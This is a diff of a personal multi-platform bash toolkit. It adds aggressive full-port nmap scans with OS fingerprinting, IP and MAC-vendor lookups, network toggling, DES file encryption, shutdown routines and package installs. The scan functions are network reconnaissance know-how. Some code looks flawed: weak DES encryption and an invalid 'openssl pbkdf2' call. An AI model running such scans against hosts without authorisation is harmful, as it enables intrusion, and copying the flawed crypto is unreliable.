+       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -sV -sSU $1
+    else
+       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -sV -sSU $1
+    fi
 
 }
 
 
 _wtf6(){ #selft
 
-    sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -p1-65535 -sSU -6 $1
+
+
+    if [ $2 == "i" ]; then
+       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -p1-65535 -sSU -6 $1
+    else
+       sudo nmap -A -T4 -n -O --osscan-guess -vv -Pn -p1-65535 -sSU -6 $1
+    fi
 
 
 }
@@ -4675,40 +6491,65 @@ _wtf6(){ #selft
 
 _pizdec(){ #selft
 
-     sudo nmap -A -Pn -T4 -n -vv -p1-65535 $1
+
+
+
+     if [ $2 == "i" ]; then
+        sudo nmap -A -Pn -T4 -n -vv -p1-65535 $1
+     else
+        sudo nmap -A -Pn -T4 -n -vv -p1-65535 $1
+     fi
 
 }
 
 _pizdec6(){ #selft
 
-     sudo nmap -A -Pn -T4 -n -vv -p1-65535 -6 $1
+
+
+     if [ $2 == "i" ]; then
+        sudo nmap -A -Pn -T4 -n -vv -p1-65535 -6 $1
+     else
+        sudo nmap -A -Pn -T4 -n -vv -p1-65535 -6 $1
+     fi
 
 }
 
 
 _blyat(){ #selft
 
-    sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn $1
+
+
+    if [ $2 == "i" ]; then
+       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn $1
+    else
+       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn $1
+    fi
 
 }
 
 _blyat6(){ #selft
 
-    sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn -6 $1
+
+
+    if [ $2 == "i" ]; then
+       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn -6 $1
+    else
+       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn -6 $1
+    fi
 
 }
 
 
 _IP(){ #selft
 
-    nslookup $1 | sed -n '6p' | awk '{print $1;}' $1
+    nslookup $1 | sed -n '6p' | awk '{print $2}'
 
 }
 
 
 _look(){ #selft
 
-    curl ipinfo.io/$(nslookup $1 | sed -n '6p' | awk '{print $1;}')
+    curl ipinfo.io/$(nslookup $1 | sed -n '6p' | awk '{print $2}')
 
 }
 
@@ -4750,7 +6591,7 @@ _generalize(){ #selfp
 
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then   #tw
 
   clear
   #printf "Darwin DEBUG STR: $_system\n"
@@ -4780,7 +6621,7 @@ _generalize(){ #selfp
   date
   printf "$NC\n"
 
-  elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then  #tw
 
     clear
     #printf "Linux DEBUG STR: $_system\n"
@@ -4809,7 +6650,7 @@ _generalize(){ #selfp
     printf "$NC\n"
 
 
-  elif [[ $_system == "GNU" ]]; then
+  elif [[ $_system == "GNU" ]]; then   #nn
 
 
 
@@ -4832,7 +6673,7 @@ _generalize(){ #selfp
     date
     printf "$NC\n"
 
-  elif [[ $_system == "Haiku" ]]; then
+  elif [[ $_system == "Haiku" ]]; then  #tw
 
     clear
     _wts
@@ -4859,7 +6700,7 @@ _generalize(){ #selfp
     date
     printf "$NC\n"
 
-  elif [[ $_system == "HP-UX" ]]; then
+  elif [[ $_system == "HP-UX" ]]; then  #nn
 
     clear
     _wts
@@ -4886,7 +6727,7 @@ _generalize(){ #selfp
     date
     printf "$NC\n"
 
-  elif [[ $_system == "Minix" ]]; then
+  elif [[ $_system == "Minix" ]]; then   #nn
 
     clear
     _wts
@@ -4911,7 +6752,7 @@ _generalize(){ #selfp
     date
     printf "$NC\n"
 
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then   #nn
 
     clear
     #printf "OpenBSD DEBUG STR: $_system\n"
@@ -4937,7 +6778,7 @@ _generalize(){ #selfp
     date
     printf "$NC\n"
 
-  elif [[ $_system == "SunOS" ]]; then
+  elif [[ $_system == "SunOS" ]]; then   #nn
 
     clear
     _wts
@@ -4966,13 +6807,13 @@ _generalize(){ #selfp
 
 
 
-  elif [[ $_system == "$(uname -n)" ]]; then  # UNIX
+  elif [[ $_system == "$(uname -n)" ]]; then  #nn
 
     clear
     printf "UNIX DEBUG STR: $_system\n"
     #_wts
     #_motto
-    printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
+    #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
     printf "\n`echo Local IP  ` >> $YELLOW`ifconfig enp0s3 | grep inet | awk '{print $2}'`$NC"
     printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig enp0s3 | grep ether | awk '{print $2;}'`$NC"
     printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
@@ -4993,7 +6834,7 @@ _generalize(){ #selfp
     printf "$NC\n"
 
 
-  elif [[ $_system == "OS/390" ]]; then
+  elif [[ $_system == "OS/390" ]]; then #nn
 
     clear
     _wts
@@ -5079,7 +6920,7 @@ _spread(){ #selfi
 
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then  #nn
 
     echo "Mac spreading..."
 
@@ -5107,6 +6948,8 @@ _spread(){ #selfi
 
     brew install tor >/dev/null 2>&1
 
+    brew install mas >/dev/null 2>&1
+
     brew install git-lfs >/dev/null 2>&1
 
     git lfs install >/dev/null 2>&1
@@ -5123,7 +6966,16 @@ _spread(){ #selfi
 
     sudo gem install iStats >/dev/null  2>&1
 
-  elif [[ $_system == "Linux" ]]; then
+    mas lucky shazam
+
+    mas install 476566660
+
+    mas install 1133106875
+
+    sudo cat /etc/pam.d/sudo # add auth sufficient pam_tid.so
+
+
+  elif [[ $_system == "Linux" ]]; then #nn
 
     echo "Linux spreading..."
 
@@ -5162,7 +7014,7 @@ _spread(){ #selfi
     printf "$YELLOW W :: Unknown linux type ::$RED $_type$NC\n"
   fi
 
-elif [[ $_system == "GNU" ]]; then
+elif [[ $_system == "GNU" ]]; then #nn
 
   echo "Hurd spreading..."
 
@@ -5176,7 +7028,7 @@ elif [[ $_system == "GNU" ]]; then
 
   apt install nmap -y
 
-  elif [[ $_system == "Haiku" ]]; then
+elif [[ $_system == "Haiku" ]]; then  #tw
 
     echo "Haiku spreading..."
 
@@ -5184,7 +7036,7 @@ elif [[ $_system == "GNU" ]]; then
 
 
 
-  elif [[ $_system == "Minix" ]]; then
+  elif [[ $_system == "Minix" ]]; then  #tn
 
     echo "Minix spreading..."
 
@@ -5198,7 +7050,7 @@ elif [[ $_system == "GNU" ]]; then
 
     pkgin install git-base -y
 
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then #nn
 
     echo " OpenBSD spreading..."
 
@@ -5359,7 +7211,7 @@ _macV(){ #demon
       {
       # Test Connection One
         ping -c 1 standards-oui.ieee.org &> /dev/null
-        [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] Was unable to reach the first database." && exit 68
+        [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] SDBFI." && exit 68
 
         # Test Connection Two
         #  ping -c 1 github.com &> /dev/null
@@ -5367,7 +7219,7 @@ _macV(){ #demon
       # Download Database
 
         database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
-        [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
+        [[ -z $database ]] && echo "[Error 13:$(($LINENO - 1))] SDBFR" && exit 72
 
 
     : '
@@ -5428,10 +7280,10 @@ _macV(){ #demon
 
         # Test Connection Two
           ping -c 1 github.com &> /dev/null
-          [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
+          [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] BDBFI" && exit 68
       # Download Database
         database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
-        [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
+        [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] BDBFR" && exit 72
 
     : '
         if [ "$database" | grep -c Moved > 1 ]
@@ -5617,7 +7469,7 @@ _newj(){ #selft
   && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
   # Search Database
   get_database
-  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{print $6,$7}')"
+  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{print $6,$7}' | sed 's/<\/td>//g')"
   [[ -z $vendor ]] && vendor="Unknown"
   # Print Result
   printf "$BLUE$vendor$NC\n"
@@ -5641,27 +7493,27 @@ _lock(){ #selfc
 
 
 
- if [ $_system == "Darwin" ]; then
+ if [ $_system == "Darwin" ]; then  #tw
 
    pmset displaysleepnow
 
- elif [[ $_system == "Linux" ]]; then
+ elif [[ $_system == "Linux" ]]; then  #tw
 
    gnome-screensaver-command -l
 
- elif [[ $_system == "OpenBSD" ]]; then
+ elif [[ $_system == "GNU" ]]; then #tw
 
-   printf "$RED Not supported yet$NC\n"
+   exec login ; exec login
 
  elif [[ $_system == "Minix" ]]; then
 
    printf "$RED Not supported yet$NC\n"
 
- elif [[ $_system == "GNU" ]]; then
+ elif [[ $_system == "OpenBSD" ]]; then
 
    printf "$RED Not supported yet$NC\n"
 
- elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+ elif [[ $_system == "$(uname -n)" ]]; then
 
    printf "$RED Not supported yet$NC\n"
 
@@ -5686,19 +7538,27 @@ _off(){ #selfc
   _system="$(uname -s)"
 
 
- if [ $_system == "Darwin" ]; then
-   sudo airport -z
- elif [[ $_system == "Linux" ]]; then
-   sudo ip link set dev enp0s3 down
- elif [[ $_system == "OpenBSD" ]]; then
+ if [ $_system == "AIX" ]; then
    printf "$RED Not supported yet$NC\n"
- elif [[ $_system == "Minix" ]]; then
+ elif [[ $_system == "Darwin" ]]; then #tw
+   sudo airport -z
+ elif [[ $_system == "Linux" ]]; then #nn
+   sudo ip link set dev enp0s3 down
+ elif [[ $_system == "GNU" ]]; then
    printf "$RED Not supported yet$NC\n"
  elif [[ $_system == "Haiku" ]]; then
    printf "$RED Not supported yet$NC\n"
- elif [[ $_system == "GNU" ]]; then
+ elif [[ $_system == "HP-UX" ]]; then
    printf "$RED Not supported yet$NC\n"
- elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+ elif [[ $_system == "Minix" ]]; then
+   printf "$RED Not supported yet$NC\n"
+ elif [[ $_system == "OpenBSD" ]]; then
+   printf "$RED Not supported yet$NC\n"
+ elif [[ $_system == "SunOS" ]]; then
+   printf "$RED Not supported yet$NC\n"
+ elif [[ $_system == "$(uname -n)" ]]; then
+   printf "$RED Not supported yet$NC\n"
+ elif [[ $_system == "OS/390" ]]; then
    printf "$RED Not supported yet$NC\n"
  else
    printf "$RED Not supported default$NC\n"
@@ -5779,12 +7639,12 @@ _flush(){ #selft
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "Darwin" ]; then #nn
    sudo killall -HUP mDNSResponder
 elif [[ $_system == "Linux" ]]; then
    printf "$RED Not supported yet$NC\n"
- elif [[ $_system == "GNU" ]]; then
-    printf "$RED Not supported yet$NC\n"
+elif [[ $_system == "GNU" ]]; then
+   printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "Haiku" ]]; then
    printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "HP-UX" ]]; then
@@ -5795,7 +7655,17 @@ elif [[ $_system == "OpenBSD" ]]; then
    printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "SunOS" ]]; then
    printf "$RED Not supported yet$NC\n"
-elif [[ $_system == "$(uname -n)" ]]; then   #UNIX
+elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+   printf "$RED Not supported yet$NC\n"
+elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+   printf "$RED Not supported yet$NC\n"
+elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+   printf "$RED Not supported yet$NC\n"
+elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+   printf "$RED Not supported yet$NC\n"
+elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+   printf "$RED Not supported yet$NC\n"
+elif [[ $_system == "$(uname -n)" ]]; then
    printf "$RED Not supported yet$NC\n"
 elif [[ $_system == "OS/390" ]]; then
    printf "$RED Not supported yet$NC\n"
@@ -5813,7 +7683,9 @@ _on(){ #selft
 
    _system="$(uname -s)"
 
-   if [ $_system == "Darwin" ]; then
+   if [ $_system == "AIX" ]; then
+     printf "$RED Not supported yet$NC\n"
+   elif [[ $_system == "Darwin" ]]; then #nn
      networksetup -setairportpower en0 off
      networksetup -setairportpower en0 on
    elif [[ $_system == "Linux" ]]; then
@@ -5822,14 +7694,20 @@ _on(){ #selft
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "Haiku" ]]; then
      printf "$RED Not supported yet$NC\n"
+   elif [[ $_system == "HP-UX" ]]; then
+     printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "Minix" ]]; then
      printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "OpenBSD" ]]; then
      printf "$RED Not supported yet$NC\n"
+   elif [[ $_system == "SunOS" ]]; then
+     printf "$RED Not supported yet$NC\n"
+   elif [[ $_system == "$(uname -n)" ]]; then
+     printf "$RED Not supported yet$NC\n"
    elif [[ $_system == "OS/390" ]]; then
      printf "$RED Not supported yet$NC\n"
    else
-     printf "$RED Not supported default$NC\n"
+     printf "$RED Not supported sys$NC\n"
    fi
 
 }
@@ -5844,17 +7722,17 @@ _metamorph(){ #selfx
    if [[ $1 == "image" ]]; then
 
       if [ $2 == "iso" ]; then
-        if [ $_system == "Darwin" ]; then
+        if [ $_system == "Darwin" ]; then #tn
             sudo hdiutil makehybrid -iso -joliet -o $3.iso $4
-        elif [[ $_system == "Linux" ]]; then
+        elif [[ $_system == "Linux" ]]; then #tw
             mkisofs -o $3.iso $4
-        elif [[ $_system == "GNU" ]]; then
+        elif [[ $_system == "GNU" ]]; then #nn
             mkisofs -o $3.iso $4
-        elif [[ $_system == "Haiku" ]]; then
+        elif [[ $_system == "Haiku" ]]; then #nn
             mkisofs -o $3.iso $4
-        elif [[ $_system == "Minix" ]]; then
+        elif [[ $_system == "Minix" ]]; then #nn
             mkisofs -o $3.iso $4
-        elif [[ $_system == "OpenBSD" ]]; then
+        elif [[ $_system == "OpenBSD" ]]; then #nn
             mkisofs -o $3.iso $4
         else
             printf "$RED Not supported sys$NC\n"
@@ -5866,17 +7744,17 @@ _metamorph(){ #selfx
    elif [[ $1 == "arch" ]]; then
 
      if [ $2 == "tar" ]; then
-       if [ $_system == "Darwin" ]; then
+       if [ $_system == "Darwin" ]; then #tw
           sudo tar -vcf $3.tar $4
-       elif [[ $_system == "Linux" ]]; then
+       elif [[ $_system == "Linux" ]]; then #tw
           sudo tar -vcf $3.tar $4
-       elif [[ $_system == "GNU" ]]; then
+       elif [[ $_system == "GNU" ]]; then #nn
           sudo tar -vcf $3.tar $4
-       elif [[ $_system == "Haiku" ]]; then
+       elif [[ $_system == "Haiku" ]]; then #nn
           sudo tar -vcf $3.tar $4
-       elif [[ $_system == "Minix" ]]; then
+       elif [[ $_system == "Minix" ]]; then #nn
            sudo tar -vcf $3.tar $4
-       elif [[ $_system == "OpenBSD" ]]; then
+       elif [[ $_system == "OpenBSD" ]]; then #nn
            sudo tar -vcf $3.tar $4
        else
           printf "$RED Not supported sys$NC\n"
@@ -5887,17 +7765,17 @@ _metamorph(){ #selfx
 
    elif [[ $1 == "-e" ]]; then
 
-     if [ $_system == "Darwin" ]; then
+     if [ $_system == "Darwin" ]; then #tw
         openssl des -in $2 -out $2.sslz
-      elif [[ $_system == "Linux" ]]; then
+      elif [[ $_system == "Linux" ]]; then #tw
         openssl des -in $2 -out $2.sslz
-      elif [[ $_system == "GNU" ]]; then
+      elif [[ $_system == "GNU" ]]; then #tw
         openssl pbkdf2 -in $2 -out $2.sslz
-      elif [[ $_system == "Haiku" ]]; then
+      elif [[ $_system == "Haiku" ]]; then #nn
         openssl des -in $2 -out $2.sslz
-      elif [[ $_system == "Minix" ]]; then
+      elif [[ $_system == "Minix" ]]; then #nn
         openssl des -in $2 -out $2.sslz
-      elif [[ $_system == "OpenBSD" ]]; then
+      elif [[ $_system == "OpenBSD" ]]; then #nn
         openssl des -in $2 -out $2.sslz
       else
         printf "$RED Not supported sys$NC\n"
@@ -5905,17 +7783,17 @@ _metamorph(){ #selfx
 
    elif [[ $1 == "-d" ]]; then
 
-        if [ $_system == "Darwin" ]; then
+        if [ $_system == "Darwin" ]; then #tw
            openssl des -d -in $2 -out $2.d
-         elif [[ $_system == "Linux" ]]; then
+         elif [[ $_system == "Linux" ]]; then #tw
            openssl des -d -in $2 -out $2.d
-         elif [[ $_system == "GNU" ]]; then
+         elif [[ $_system == "GNU" ]]; then #tw
            openssl pbkdf2 -d -in $2 -out $2.d
-         elif [[ $_system == "Haiku" ]]; then
+         elif [[ $_system == "Haiku" ]]; then #nn
            openssl des -d -in $2 -out $2.d
-         elif [[ $_system == "Minix" ]]; then
+         elif [[ $_system == "Minix" ]]; then #nn
            openssl des -d -in $2 -out $2.d
-         elif [[ $_system == "OpenBSD" ]]; then
+         elif [[ $_system == "OpenBSD" ]]; then #nn
            openssl des -d -in $2 -out $2.d
          else
            printf "$RED Not supported sys$NC\n"
@@ -5979,7 +7857,7 @@ _mb(){ #selfc
 
 
 
-_profile_core(){
+_profile_core(){ #selfc
 
 
   printf "Muie\n"
@@ -7345,14 +9223,32 @@ _inject(){ #selfi
     source .bashrc
     clear
     printf "$RED _injected$NC\n"
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "Haiku" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "HP-UX" ]]; then
     printf "$RED Not supported yet$NC\n"
   elif [[ $_system == "Minix" ]]; then
     printf "$RED Not supported yet$NC\n"
-  elif [[ $_system == "Haiku" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "SunOS" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "$(uname -n)" ]]; then
+    printf "$RED Not supported yet$NC\n"
+  elif [[ $_system == "OS/390" ]]; then
     printf "$RED Not supported yet$NC\n"
   else
-    printf "$RED Not supported default$NC\n"
+    printf "$RED Not supported sys$NC\n"
   fi
 
 }
@@ -7364,40 +9260,44 @@ _blood(){ #selft
   _system="$(uname -s)"
 
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then #tw
 
   _red ; clear ; netstat -ap tcp ; quietTextRestore
 
-  elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tn
 
    _red ; clear ; netstat -ap tcp ; quietTextRestore
 
- elif [[ $_system == "GNU" ]]; then
+ elif [[ $_system == "GNU" ]]; then #nn
 
    printf "$RED Not supported yet$NC\n"
 
- elif [[ $_system == "Haiku" ]]; then
+ elif [[ $_system == "Haiku" ]]; then #nn
 
     _red ; clear ; netstat ; quietTextRestore
 
-  elif [[ $_system == "HP-UX" ]]; then
+  elif [[ $_system == "HP-UX" ]]; then #nn
 
     _red ; clear ; netstat -ap tcp ; quietTextRestore
 
 
-  elif [[ $_system == "Minix" ]]; then
+  elif [[ $_system == "Minix" ]]; then #nn
 
     _red ; clear ; netstat -ap tcp ; quietTextRestore
 
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then #nn
 
     _red ; clear ; netstat -ap tcp ; quietTextRestore
 
-  elif [[ $_system == "SunOS" ]]; then
+  elif [[ $_system == "SunOS" ]]; then #nn
 
     _red ; clear ; netstat -ap tcp ; quietTextRestore
 
-  elif [[ $_system == "OS/390" ]]; then
+  elif [[ $_system == "$(uname -n)" ]]; then #nn
+
+    _red ; clear ; netstat -ap tcp ; quietTextRestore
+
+  elif [[ $_system == "OS/390" ]]; then #nn
 
     _red ; clear ; netstat -ap tcp ; quietTextRestore
 
@@ -7416,45 +9316,49 @@ _light(){ #selft
 _system="$(uname -s)"
 
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "Darwin" ]; then #tw
 
 _yellow ; clear ; netstat -ap udp ; quietTextRestore
 
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
 
  _yellow ; clear ; netstat -ap udp ; quietTextRestore
 
-elif [[ $_system == "GNU" ]]; then
+elif [[ $_system == "GNU" ]]; then #nn
 
-  printf "$RED Not supported yet$NC\n"
+  printf "$RED Not supported yet$NC\n" # no netstat. pizdu
 
-elif [[ $_system == "Haiku" ]]; then
+elif [[ $_system == "Haiku" ]]; then #nn
 
   _yellow ; clear ; netstat ; quietTextRestore
 
-elif [[ $_system == "HP-UX" ]]; then
+elif [[ $_system == "HP-UX" ]]; then #nn
 
   _yellow ; clear ; netstat -ap udp ; quietTextRestore
 
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "Minix" ]]; then #nn
 
   _yellow ; clear ; udpstat ; quietTextRestore
 
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #nn
 
   _yellow ; clear ; netstat -ap udp ; quietTextRestore
 
-elif [[ $_system == "SunOS" ]]; then
+elif [[ $_system == "SunOS" ]]; then #nn
 
   _yellow ; clear ; netstat -ap udp ; quietTextRestore
 
-elif [[ $_system == "OS/390" ]]; then
+elif [[ $_system == "$(uname -n)" ]]; then #nn
+
+  _yellow ; clear ; netstat -ap udp ; quietTextRestore
+
+elif [[ $_system == "OS/390" ]]; then #nn
 
   _yellow ; clear ; netstat -ap udp ; quietTextRestore
 
 else
 
-  printf "$RED Not supported default$NC\n"
+  printf "$RED Not supported sys$NC\n"
 
 fi
 
@@ -7465,39 +9369,63 @@ _poof(){ #selfc
 
   _system="$(uname -s)"
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "Darwin" ]; then #tw
 
     killall Terminal
 
-  elif [[ $_system == "Linux" ]]; then
+  elif [[ $_system == "Linux" ]]; then #tn
 
     killall gnome-terminal
 
-  elif [[ $_system == "GNU" ]]; then
+  elif [[ $_system == "GNU" ]]; then #nn
 
     kill $(ps -a | grep term)
 
-  elif [[ $_system == "Haiku" ]]; then
+  elif [[ $_system == "Haiku" ]]; then #nn
 
     killall Terminal
 
-  elif [[ $_system == "HP-UX" ]]; then
+  elif [[ $_system == "HP-UX" ]]; then #nn
 
     killall terminal
 
-  elif [[ $_system == "Minix" ]]; then
+  elif [[ $_system == "Minix" ]]; then #nn
 
     killall terminal
 
-  elif [[ $_system == "OpenBSD" ]]; then
+  elif [[ $_system == "OpenBSD" ]]; then #nn
 
     killall terminal
 
-  elif [[ $_system == "SunOS" ]]; then
+  elif [[ $_system == "SunOS" ]]; then #nn
 
     killall terminal
 
-  elif [[ $_system == "OS/390" ]]; then
+  elif [[ $_system == "CYGWIN_NT-5.0" ]]; then #nn
+
+    killall terminal
+
+  elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
+
+    killall terminal
+
+  elif [[ $_system == "CYGWIN_NT-6.0" ]]; then #nn
+
+    killall terminal
+
+  elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
+
+    killall terminal
+
+  elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
+
+    killall terminal
+
+  elif [[ $_system == "$(uname -n)" ]]; then #nn
+
+    killall terminal
+
+  elif [[ $_system == "OS/390" ]]; then #nn
 
     killall terminal
 
@@ -7524,26 +9452,28 @@ _macA(){ #selft
 
 _system="$(uname -s)"
 
-if [ $_system == "Darwin" ]; then
+if [ $_system == "Darwin" ]; then #tw
    ifconfig en0 | grep ether | awk '{print $2}'
-elif [[ $_system == "Linux" ]]; then
+elif [[ $_system == "Linux" ]]; then #tw
    ifconfig enp0s3 | grep ether | awk '{print $2}'
-elif [[ $_system == "GNU" ]]; then
+elif [[ $_system == "GNU" ]]; then #tw
    inetutils-ifconfig | grep hardware | awk '{print $3}'
-elif [[ $_system == "Haiku" ]]; then
+elif [[ $_system == "Haiku" ]]; then #tw
    ifconfig | grep Address | sed '1d' | awk '{print $5}'
-elif [[ $_system == "HP-UX" ]]; then
+elif [[ $_system == "HP-UX" ]]; then #nn
    ifconfig em0 | grep lladdr | awk '{print $2}'
-elif [[ $_system == "Minix" ]]; then
+elif [[ $_system == "Minix" ]]; then #tw
    hostaddr -e
-elif [[ $_system == "OpenBSD" ]]; then
+elif [[ $_system == "OpenBSD" ]]; then #tw
    ifconfig em0 | grep lladdr | awk '{print $2}'
-elif [[ $_system == "SunOS" ]]; then
+elif [[ $_system == "SunOS" ]]; then #nn
    ifconfig em0 | grep lladdr | awk '{print $2}'
-elif [[ $_system == "OS/390" ]]; then
+elif [[ $_system == "$(uname -n)" ]]; then #nn
+   ifconfig em0 | grep lladdr | awk '{print $2}'
+elif [[ $_system == "OS/390" ]]; then #nn
    ifconfig em0 | grep lladdr | awk '{print $2}'
 else
-   printf "$RED Not supported default $NC\n"
+   printf "$RED Not supported sys$NC\n"
 fi
 #  printf "$YELLOW$(ifconfig en0 | grep ether | awk '{print $2}')$NC\n"
 
@@ -7556,38 +9486,40 @@ _suicide(){ #selfc
   _system="$(uname -s)"
 
 
-  if [ $_system == "Darwin" ]; then
+  if [ $_system == "AIX" ]; then #nn
+     shutdown
+   elif [[ $_system == "Darwin" ]]; then #tw
      sudo shutdown now
-  elif [[ $_system == "Linux" ]]; then
+  elif [[ $_system == "Linux" ]]; then #tw
      shutdown now
-   elif [[ $_system == "GNU" ]]; then
+   elif [[ $_system == "GNU" ]]; then #tw
      su
      shutdown now
-   elif [[ $_system == "Haiku" ]]; then
+   elif [[ $_system == "Haiku" ]]; then #tw
      shutdown
-   elif [[ $_system == "HP-UX" ]]; then
+   elif [[ $_system == "HP-UX" ]]; then #nn
      shutdown
-   elif [[ $_system == "Minix" ]]; then
+   elif [[ $_system == "Minix" ]]; then #tw
      shutdown now
-   elif [[ $_system == "OpenBSD" ]]; then
+   elif [[ $_system == "OpenBSD" ]]; then #tw
      shutdown now
-   elif [[ $_system == "AIX" ]]; then
+   elif [[ $_system == "SunOS" ]]; then #nn
      shutdown
-   elif [[ $_system == "SunOS" ]]; then
+   elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
      shutdown
-   elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+   elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
      shutdown
-   elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+   elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
      shutdown
-   elif [[ $_system == "CYGWIN_NT-10.0" ]]; then
+   elif [[ $_system == "$(uname -n)" ]]; then #nn
      shutdown
-   elif [[ $_system == "OS/390" ]]; then
+   elif [[ $_system == "OS/390" ]]; then #nn
      shutdown
-   elif [[ $_system == "INTEGRITY" ]]; then
+   elif [[ $_system == "INTEGRITY" ]]; then #nn
      shutdown ; shutdown now ; shutdown -s ; shutdown -n ; shutdown -t 0
-   elif [[ $_system == "Integrity" ]]; then
+   elif [[ $_system == "Integrity" ]]; then #nn
      shutdown ; shutdown now ; shutdown -s ; shutdown -n ; shutdown -t 0
-   elif [[ $_system == "$(uname -n)" ]]; then # UNIX
+   elif [[ $_system == "$(uname -n)" ]]; then #nn
      shutdown
    else
      printf "$RED Not supported sys$NC\n"
@@ -7605,38 +9537,40 @@ _reboot(){ #selfc
 _system="$(uname -s)"
 
 
-if [ $_system == "Darwin" ]; then
-   sudo reboot now -l
-elif [[ $_system == "Linux" ]]; then
-   sudo reboot now
- elif [[ $_system == "OpenBSD" ]]; then
+if [ $_system == "AIX" ]; then #nn
    reboot
- elif [[ $_system == "Minix" ]]; then
+ elif [[ $_system == "Darwin" ]]; then #tw
+   sudo reboot now -l
+elif [[ $_system == "Linux" ]]; then #tw
+   sudo reboot now
+ elif [[ $_system == "OpenBSD" ]]; then #tw
+   reboot
+ elif [[ $_system == "Minix" ]]; then #tw
    reboot now
- elif [[ $_system == "GNU" ]]; then
+ elif [[ $_system == "GNU" ]]; then #tw
    su
    reboot -f
- elif [[ $_system == "Haiku" ]]; then
+ elif [[ $_system == "Haiku" ]]; then #tw
    reboot
- elif [[ $_system == "HP-UX" ]]; then
+ elif [[ $_system == "HP-UX" ]]; then #nn
    reboot
- elif [[ $_system == "AIX" ]]; then
+ elif [[ $_system == "SunOS" ]]; then #nn
    reboot
- elif [[ $_system == "SunOS" ]]; then
+ elif [[ $_system == "CYGWIN_NT-5.1" ]]; then #nn
    reboot
- elif [[ $_system == "CYGWIN_NT-5.1" ]]; then
+ elif [[ $_system == "CYGWIN_NT-6.1" ]]; then #nn
    reboot
- elif [[ $_system == "CYGWIN_NT-6.1" ]]; then
+ elif [[ $_system == "CYGWIN_NT-10.0" ]]; then #nn
    reboot
